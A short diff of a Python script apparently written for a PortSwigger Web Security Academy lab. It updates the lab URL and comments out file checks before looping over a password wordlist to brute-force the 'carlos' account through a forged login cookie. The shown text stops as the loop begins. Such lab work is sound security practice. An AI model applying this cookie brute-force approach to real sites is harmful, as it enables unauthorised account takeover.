@@ -11,17 +11,17 @@ import requests
 #encrypting cookie
 #b64 = base64.b64encode(combo.encode()).decode()
 
-url = "https://0a22001f03612b728352165100f8005f.web-security-academy.net/my-account?id=carlos"
+url = "https://0af100d804fd3dc080466c8e00cd0030.web-security-academy.net/my-account?id=carlos"
 username = "carlos"
 
-import os
+#import os
 
-print("Current working directory:", os.getcwd())
-print("Files in current directory:", os.listdir('.'))
+#print("Current working directory:", os.getcwd())
+#print("Files in current directory:", os.listdir('.'))
 
-if not os.path.exists("portswigger_Labs_corr/auth/wordlistCookie.txt"):
-    print("[-] File not found. Did you put it in the right folder?")
-    exit(1)
+#if not os.path.exists("portswigger_Labs_corr/auth/wordlistCookie.txt"):
+ #   print("[-] File not found. Did you put it in the right folder?")
+  #  exit(1)
 
 with open("portswigger_Labs_corr/auth/wordlistCookie.txt", "r") as f:
     for password in f:
